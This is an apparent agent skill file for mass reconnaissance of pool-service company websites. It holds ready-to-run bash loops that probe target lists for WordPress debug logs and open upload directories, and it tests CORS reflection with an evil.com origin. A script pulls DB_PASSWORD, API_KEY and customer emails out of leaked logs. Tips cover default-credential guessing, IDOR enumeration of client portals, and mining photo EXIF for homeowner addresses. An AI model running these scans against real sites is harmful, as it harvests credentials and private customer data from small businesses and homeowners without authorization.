---
name: recon-pools
description: "Sector-specific recon for pool service and pool construction company websites — pool cleaning, repair, installation, hot tubs. Typically WordPress on shared hosting with booking systems, photo galleries, and seasonal service content."
sources: field_recon, sector_mass_recon
report_count: 5
---

# RECON-POOLS — Sector-Specific Recon for Pool Service/Construction Company Sites

## When to Use

Use when the target scope includes pool service, pool construction, hot tub, or spa company domains. These businesses share the same low-security posture as other SMB service providers but have unique characteristics: high-value photo galleries (pool builds before/after), booking systems for recurring service schedules, and payment portals for service contracts. Common findings: directory listing showing pools under construction with EXIF geolocation, debug log exposure, and booking system vulnerabilities.

## Quick Reference

```bash
for t in $(cat pool-targets.txt); do
  echo "=== $t ==="
  curl -skI "https://$t/" | grep -iE "wordpress|php|wp-"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/uploads/"
  curl -skI "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Common patterns: <city>pools.com, <name>poolservice.com, <area>poolcleaning.com
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee pool-subdomains-$TARGET.txt
```

### Phase 2 — WordPress Recon + Gallery Discovery
```bash
# Gallery directory listing (pool builds — high-value before/after photos)
for path in /wp-content/uploads/ /images/portfolio/ /galleries/ /our-work/ /pool-gallery/ /builds/; do
  body=$(curl -sk "https://$TARGET$path" 2>/dev/null)
  if echo "$body" | grep -q "Index of"; then
    echo "[!!!] DIRECTORY LISTING: $path"
    echo "$body" | grep -oP 'href="[^"]+\.(jpg|png|gif|mp4)' | head -20
  fi
done

# Debug log with service contract PII
curl -sk "https://$TARGET/wp-content/debug.log" -o /tmp/pool_debug.log 2>/dev/null
if [ -s /tmp/pool_debug.log ]; then
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/pool_debug.log | sort -u | head -20
  grep -oP '(DB_PASSWORD|DB_USER|DB_NAME|API_KEY).{0,80}' /tmp/pool_debug.log | head -10
fi

# CORS on REST API
curl -skI "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com"
```

### Phase 3 — Service Portal Recon
```bash
# Pool service companies often have client portals
for path in /portal /client-portal /my-account /login /schedule-service /service-request; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Portal endpoint: $path (HTTP $code)"
done

# Check for online payment systems
curl -sk "https://$TARGET/" | grep -oP 'stripe\.com|squareup\.com|paypal\.com|authorize\.net'
```

## Attack Surface Signals

- CMS: WordPress (most common), some custom PHP
- Hosting: Shared hosting (GoDaddy, HostGator, SiteGround)
- Stack: PHP + MySQL, Pool build photo galleries, Service booking/portal, Online payment integration
- Typical findings: Directory listing of pool build photos with EXIF data, Debug log with customer PII, CORS credential reflection, XMLRPC open

## Common Root Causes

1. **Pool build photo galleries left open** — no auth on before/after photos showing backyard layouts, EXIF data leaks homeowner addresses
2. **Seasonal site neglect** — sites built for summer season, ignored in off-season, plugin CVEs accumulate
3. **Service portal without proper auth** — client portals built with page builders, often have IDOR or weak auth

## Bypass Techniques

- Pool build photo galleries often have sequential filenames (pool_001.jpg, pool_002.jpg) — iterate to find unlisted photos
- Service portal login pages may have default credentials (admin/password, user/user) for trial accounts
- Seasonal service pages (/summer-pool-care, /winterization) built in a hurry may have debug output enabled
- Pool construction project pages often have client names and addresses in URL slugs (/project-smith-residence)
- Google Maps API keys for service area pages are frequently unrestricted
- Check for /pool-gallery directories that list ALL photos including deleted ones

## Real Examples

From cross-sector mass recon observation:
- A pool construction company had directory listing on /wp-content/uploads/ exposing 300+ pool build photos with EXIF geolocation data showing homeowners' backyard layouts and addresses
- A pool service company had debug.log containing customer service contracts with names, addresses, pool equipment serial numbers, and payment details
- Another pool company had a client portal at /portal that required no authentication — iterating user IDs returned full customer profiles including service history and billing info
- A hot tub retailer had a Google Maps API key on service-area pages with no referrer restriction — the key worked for any site, costing $200/day in API overage charges

## Related Skills

- recon-smb-services — broader SMB recon methodology
- recon-landscaping — similar gallery-heavy profile
- hunt-wordpress — primary CMS for pool sites
- hunt-cors — CORS credential reflection
- hunt-source-leak — debug.log, config exposure
